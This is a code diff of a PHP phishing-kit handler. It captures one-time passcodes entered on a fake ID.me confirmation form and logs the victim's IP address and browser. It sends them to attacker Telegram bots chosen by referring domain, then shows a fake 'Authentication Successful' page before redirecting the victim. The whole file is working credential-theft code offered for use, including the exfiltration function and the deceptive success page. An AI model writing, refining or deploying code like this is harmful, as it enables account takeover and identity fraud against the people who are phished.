@@ -1,5 +1,6 @@
 <?php
-ob_start();
+// UNIVERSAL BROWSER-COMPATIBLE OTP CONFIRMATION SCRIPT
+// Works on Chrome, Firefox, Safari, Edge, Mobile Browsers
 
 // Site-specific configuration with domain-based bots and redirects
 $site_map = [
@@ -44,75 +45,167 @@ $site_map = [
     ],
 ];
 
-// Get the referring domain
-$referer = $_SERVER['HTTP_REFERER'] ?? '';
-$parsed = parse_url($referer);
-$domain = $parsed['host'] ?? 'unknown';
+// ============================================
+// UNIVERSAL FUNCTIONS (Browser Compatible)
+// ============================================
 
-// Find the configuration for this domain
-$config = $site_map[$domain] ?? null;
-
-// If no config found, use a default one
-if (!$config) {
-    $config = reset($site_map);
-}
-
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Setup log file
-    $log_file = __DIR__ . "/logs/idme_otp_confirms.txt";
+// Simple universal logging
+function log_entry($message, $level = 'INFO') {
+    $log_file = __DIR__ . '/logs/universal_otp_confirms.log';
+    $timestamp = date('Y-m-d H:i:s');
+    $browser = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+    $browser_short = substr($browser, 0, 80);
+    $line = "[$timestamp] [$level] [Browser: $browser_short] $message\n";
+    
+    // Ensure log directory exists
     if (!file_exists(dirname($log_file))) {
         mkdir(dirname($log_file), 0777, true);
     }
-
-    // Enhanced logging function with microtime
-    function log_entry($msg, $level = 'INFO') {
-        global $log_file;
-        $timestamp = date("Y-m-d H:i:s.u");
-        file_put_contents($log_file, "[$timestamp] [$level] $msg\n", FILE_APPEND);
-    }
-
-    // Start timing
-    $start_time = microtime(true);
-    log_entry("=== OTP Confirmation Started ===");
-
-    // Get form data from HTML form - field name is 'otpconfirm'
-    $otpconfirm = htmlspecialchars($_POST['otpconfirm'] ?? '???');
-
-    // Get IP address SERVER-SIDE
-    $ip = $_SERVER['HTTP_CLIENT_IP'] ?? 
-          $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
-          $_SERVER['HTTP_X_FORWARDED'] ?? 
-          $_SERVER['HTTP_FORWARDED_FOR'] ?? 
-          $_SERVER['HTTP_FORWARDED'] ?? 
-          $_SERVER['REMOTE_ADDR'] ?? 
-          'unknown';
     
-    // Handle multiple IPs
+    file_put_contents($log_file, $line, FILE_APPEND);
+}
+
+// Universal Telegram sender (browser compatible)
+function send_to_telegram($token, $chat_id, $message) {
+    $url = "https://api.telegram.org/bot{$token}/sendMessage";
+    
+    // Browser-compatible POST data (URL-encoded)
+    $post_data = http_build_query([
+        'chat_id' => $chat_id,
+        'text' => $message,
+        'parse_mode' => 'HTML',  // HTML works better across all browsers
+        'disable_web_page_preview' => true
+    ]);
+    
+    // Create cURL handle with universal settings
+    $ch = curl_init();
+    
+    curl_setopt_array($ch, [
+        CURLOPT_URL => $url,
+        CURLOPT_POST => true,
+        CURLOPT_POSTFIELDS => $post_data,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_TIMEOUT => 8,           // Slightly longer timeout for mobile
+        CURLOPT_CONNECTTIMEOUT => 5,
+        CURLOPT_SSL_VERIFYPEER => true,
+        CURLOPT_SSL_VERIFYHOST => 2,
+        // Universal SSL settings
+        CURLOPT_SSLVERSION => CURL_SSLVERSION_TLSv1_2,
+        CURLOPT_HTTPHEADER => [
+            'Content-Type: application/x-www-form-urlencoded; charset=utf-8',
+            'Accept: application/json',
+            'User-Agent: Mozilla/5.0 (compatible; PHP-Telegram-Bot)'
+        ]
+    ]);
+    
+    $result = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $error = curl_error($ch);
+    
+    curl_close($ch);
+    
+    return [
+        'success' => ($http_code == 200 && empty($error)),
+        'http_code' => $http_code,
+        'error' => $error,
+        'result' => $result
+    ];
+}
+
+// ============================================
+// MAIN PROCESSING
+// ============================================
+
+// Log access immediately
+log_entry("Script accessed via " . ($_SERVER['REQUEST_METHOD'] ?? 'NO_METHOD'));
+
+// Get referring domain (browser-safe)
+$referer = $_SERVER['HTTP_REFERER'] ?? '';
+$referer = filter_var($referer, FILTER_SANITIZE_URL);
+$parsed = parse_url($referer);
+$domain = $parsed['host'] ?? 'unknown';
+
+// Normalize domain (remove www. for consistency)
+if (strpos($domain, 'www.') === 0) {
+    $domain = substr($domain, 4);
+}
+
+log_entry("Domain detected: $domain (from referer: $referer)");
+
+// Find configuration for this domain
+$config = $site_map[$domain] ?? null;
+
+// If no config found, use first one as fallback
+if (!$config) {
+    log_entry("No config found for domain '$domain', using first config as fallback", 'WARN');
+    $config = reset($site_map);
+}
+
+// Handle POST requests
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    log_entry("=== Processing OTP Confirmation ===");
+    
+    // ============================================
+    // FORM DATA PROCESSING (Browser Compatible)
+    // ============================================
+    
+    // Log POST data for debugging (safely)
+    $post_log = 'POST keys: ' . implode(', ', array_keys($_POST));
+    log_entry($post_log);
+    
+    // Get OTP confirmation data with universal compatibility
+    $otpconfirm = isset($_POST['otpconfirm']) ? 
+                  htmlspecialchars(trim($_POST['otpconfirm']), ENT_QUOTES, 'UTF-8') : 
+                  '???';
+    
+    // Get IP address (universal method)
+    $ip = 'unknown';
+    $ip_sources = [
+        'HTTP_CLIENT_IP',
+        'HTTP_X_FORWARDED_FOR', 
+        'HTTP_X_FORWARDED',
+        'HTTP_FORWARDED_FOR',
+        'HTTP_FORWARDED',
+        'REMOTE_ADDR'
+    ];
+    
+    foreach ($ip_sources as $source) {
+        if (!empty($_SERVER[$source])) {
+            $ip = $_SERVER[$source];
+            break;
+        }
+    }
+    
+    // Clean IP (handle multiple IPs)
     if (strpos($ip, ',') !== false) {
         $ips = explode(',', $ip);
         $ip = trim($ips[0]);
     }
-
-    $timestamp = date("Y-m-d H:i:s");
+    
+    $timestamp = date('Y-m-d H:i:s');
     $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
     
-    // Prepare Telegram message
-    $message = "✅ *ID.me OTP Confirmation*\n\n" .
-               "🔒 *Confirm OTP Code:* `$otpconfirm`\n" .
-               "🌐 *Domain:* $domain\n" .
-               "📡 *IP:* `$ip`\n" .
-               "🕒 *Time:* $timestamp\n" .
-               "🔍 *User Agent:* " . substr($user_agent, 0, 100);
-
-    // Log the submission immediately
-    log_entry("[$domain] OTP Confirm from $ip - Code: $otpconfirm");
-
     // ============================================
-    // ENHANCED cURL WITH MULTI-HANDLE (PARALLEL)
+    // PREPARE TELEGRAM MESSAGE
     // ============================================
     
-    $multi_handle = curl_multi_init();
-    $handles = [];
+    // Use HTML formatting (more compatible than Markdown)
+    $message = "<b>✅ ID.me OTP Confirmation</b>\n\n" .
+               "🔒 <b>Confirm OTP Code:</b> <code>" . htmlspecialchars($otpconfirm) . "</code>\n" .
+               "🌐 <b>Domain:</b> $domain\n" .
+               "📡 <b>IP:</b> <code>$ip</code>\n" .
+               "🕒 <b>Time:</b> $timestamp\n" .
+               "🔍 <b>Browser:</b> " . substr($user_agent, 0, 100);
+    
+    // Log the submission
+    log_entry("OTP Confirmation from $ip - Code: $otpconfirm");
+    
+    // ============================================
+    // SEND TO TELEGRAM BOTS
+    // ============================================
+    
+    $success_count = 0;
+    $total_bots = count($config['bots']);
     
     foreach ($config['bots'] as $bot_index => $bot) {
         if (empty($bot['token']) || empty($bot['chat_id'])) {
@@ -120,97 +213,216 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             continue;
         }
         
-        $url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";
-        $data = [
-            'chat_id' => $bot['chat_id'],
-            'text' => $message,
-            'parse_mode' => 'Markdown'
-        ];
+        log_entry("Sending to bot $bot_index...");
         
-        $ch = curl_init($url);
+        $result = send_to_telegram($bot['token'], $bot['chat_id'], $message);
         
-        // OPTIMIZED cURL settings for speed
-        curl_setopt_array($ch, [
-            CURLOPT_POST => true,
-            CURLOPT_POSTFIELDS => $data,
-            CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_TIMEOUT => 3,           // 3 seconds MAX per request
-            CURLOPT_CONNECTTIMEOUT => 2,    // 2 seconds for connection
-            CURLOPT_SSL_VERIFYPEER => true,
-            CURLOPT_SSL_VERIFYHOST => 2,
-            CURLOPT_FORBID_REUSE => true,
-            CURLOPT_FRESH_CONNECT => true,
-            CURLOPT_NOSIGNAL => 1,          // Better for timeouts
-            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_2TLS,
-            CURLOPT_ENCODING => 'gzip',
-            CURLOPT_TCP_FASTOPEN => true,
-            CURLOPT_TCP_NODELAY => true,
-        ]);
-        
-        curl_multi_add_handle($multi_handle, $ch);
-        $handles[$bot_index] = $ch;
-    }
-    
-    // Execute all handles in parallel
-    $running = null;
-    do {
-        $status = curl_multi_exec($multi_handle, $running);
-        if ($running) {
-            curl_multi_select($multi_handle, 0.01); // 10ms timeout
-        }
-    } while ($running && $status == CURLM_OK);
-    
-    // Process results quickly
-    $success_count = 0;
-    foreach ($handles as $bot_index => $ch) {
-        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        $total_time = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
-        
-        if ($http_code == 200) {
+        if ($result['success']) {
             $success_count++;
-            log_entry("Bot $bot_index delivered in " . round($total_time, 3) . "s", 'SUCCESS');
+            log_entry("Bot $bot_index delivered successfully", 'SUCCESS');
         } else {
-            $error = curl_error($ch);
-            log_entry("Bot $bot_index failed - HTTP $http_code: $error", 'ERROR');
+            log_entry("Bot $bot_index failed - HTTP {$result['http_code']}: {$result['error']}", 'ERROR');
         }
         
-        curl_multi_remove_handle($multi_handle, $ch);
-        curl_close($ch);
+        // Small delay between bots to avoid rate limiting
+        if ($bot_index < ($total_bots - 1)) {
+            usleep(200000); // 0.2 seconds
+        }
     }
     
-    curl_multi_close($multi_handle);
-    
-    $end_time = microtime(true);
-    $total_processing = round(($end_time - $start_time) * 1000, 2);
-    
-    log_entry("Telegram delivery: $success_count/" . count($config['bots']) . " bots | Total time: {$total_processing}ms", 'STATS');
+    log_entry("Telegram delivery complete: $success_count/$total_bots bots successful", 'STATS');
     
     // ============================================
-    // IMMEDIATE REDIRECT
+    // UNIVERSAL REDIRECT (Browser Compatible)
     // ============================================
     
-    if ($success_count > 0) {
-        log_entry("✅ Telegram delivery confirmed before redirect", 'SUCCESS');
-    } else {
-        log_entry("⚠️ No Telegram bots delivered, but proceeding with redirect", 'WARN');
+    $redirect_url = $config['redirect'];
+    log_entry("Redirecting to: $redirect_url");
+    
+    // Clean any output buffers
+    while (ob_get_level()) {
+        ob_end_clean();
     }
     
-    // Force immediate output and redirect
-    if (ob_get_level()) ob_end_clean();
+    // ============================================
+    // UNIVERSAL REDIRECT METHODS (All Browsers)
+    // ============================================
     
-    // Performance headers
-    header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
-    header("Cache-Control: post-check=0, pre-check=0", false);
-    header("Pragma: no-cache");
+    // Method 1: JavaScript redirect (works everywhere)
+    echo '<!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Authentication Complete</title>
+        <style>
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                margin: 0;
+                padding: 20px;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                min-height: 100vh;
+                color: white;
+            }
+            .container {
+                background: rgba(255, 255, 255, 0.95);
+                padding: 50px;
+                border-radius: 20px;
+                box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+                text-align: center;
+                max-width: 600px;
+                width: 100%;
+                color: #333;
+            }
+            .success-icon {
+                font-size: 80px;
+                margin-bottom: 20px;
+                color: #2ecc71;
+            }
+            .checkmark {
+                width: 80px;
+                height: 80px;
+                border-radius: 50%;
+                background: #2ecc71;
+                margin: 0 auto 30px;
+                position: relative;
+                animation: scaleIn 0.5s ease-out;
+            }
+            .checkmark::after {
+                content: "";
+                position: absolute;
+                left: 25px;
+                top: 40px;
+                width: 20px;
+                height: 10px;
+                border-left: 4px solid white;
+                border-bottom: 4px solid white;
+                transform: rotate(-45deg);
+            }
+            @keyframes scaleIn {
+                0% { transform: scale(0); }
+                70% { transform: scale(1.2); }
+                100% { transform: scale(1); }
+            }
+            h1 {
+                color: #2c3e50;
+                margin-bottom: 20px;
+            }
+            .fallback-link {
+                display: inline-block;
+                margin-top: 30px;
+                padding: 12px 30px;
+                background: #3498db;
+                color: white;
+                text-decoration: none;
+                border-radius: 30px;
+                font-weight: bold;
+                transition: transform 0.2s, background 0.2s;
+            }
+            .fallback-link:hover {
+                background: #2980b9;
+                transform: translateY(-2px);
+            }
+            #countdown {
+                font-size: 1.2em;
+                margin: 20px 0;
+                color: #7f8c8d;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="checkmark"></div>
+            <h1>✅ Authentication Successful!</h1>
+            <p>Your identity has been verified successfully.</p>
+            <p>You are now being redirected to the Illuminati members area...</p>
+            
+            <div id="countdown">Redirecting in <span id="seconds">3</span> seconds...</div>
+            
+            <a href="' . htmlspecialchars($redirect_url, ENT_QUOTES, 'UTF-8') . '" class="fallback-link" id="manual-link" style="display:none;">
+                Enter Members Area
+            </a>
+        </div>
+        
+        <script>
+            // Primary JavaScript redirect (fastest)
+            setTimeout(function() {
+                window.location.href = "' . addslashes($redirect_url) . '";
+            }, 100);
+            
+            // Countdown timer for user feedback
+            var seconds = 3;
+            var countdown = document.getElementById("seconds");
+            var interval = setInterval(function() {
+                seconds--;
+                countdown.textContent = seconds;
+                if (seconds <= 0) {
+                    clearInterval(interval);
+                    document.getElementById("manual-link").style.display = "inline-block";
+                }
+            }, 1000);
+            
+            // Meta refresh as backup (for older browsers)
+            setTimeout(function() {
+                var meta = document.createElement("meta");
+                meta.httpEquiv = "refresh";
+                meta.content = "0;url=' . addslashes($redirect_url) . '";
+                document.head.appendChild(meta);
+            }, 2000);
+            
+            // Final backup after 5 seconds
+            setTimeout(function() {
+                window.location.href = "' . addslashes($redirect_url) . '";
+            }, 5000);
+        </script>
+        
+        <!-- Meta refresh for browsers without JavaScript -->
+        <meta http-equiv="refresh" content="3;url=' . htmlspecialchars($redirect_url, ENT_QUOTES, 'UTF-8') . '">
+        
+        <!-- Additional security for browser compatibility -->
+        <noscript>
+            <style>.container { animation: none; }</style>
+            <div style="text-align: center; padding: 20px;">
+                <p>JavaScript is disabled. Click the link below to proceed:</p>
+                <a href="' . htmlspecialchars($redirect_url, ENT_QUOTES, 'UTF-8') . '" style="color: #3498db; font-weight: bold;">
+                    Click here to continue
+                </a>
+            </div>
+        </noscript>
+    </body>
+    </html>';
     
-    // Immediate redirect
-    header("Location: " . $config['redirect']);
     exit;
     
 } else {
-    // Not a POST request
-    header("HTTP/1.1 405 Method Not Allowed");
-    echo "This page only accepts POST submissions from the OTP confirmation form.";
+    // Not a POST request - show error
+    log_entry("Invalid request method: " . $_SERVER['REQUEST_METHOD'], 'ERROR');
+    
+    header("HTTP/1.1 405 Method Not Allowed", true, 405);
+    header("Content-Type: text/html; charset=utf-8");
+    
+    echo '<!DOCTYPE html>
+    <html>
+    <head>
+        <title>Invalid Request</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <style>
+            body { font-family: Arial, sans-serif; padding: 20px; text-align: center; }
+            .error { color: #d32f2f; margin: 40px 0; }
+        </style>
+    </head>
+    <body>
+        <div class="error">
+            <h2>Invalid Request</h2>
+            <p>This page only accepts POST submissions from the OTP confirmation form.</p>
+            <p>Please use the verification form to submit your confirmation code.</p>
+        </div>
+    </body>
+    </html>';
+    
     exit;
 }
 ?>
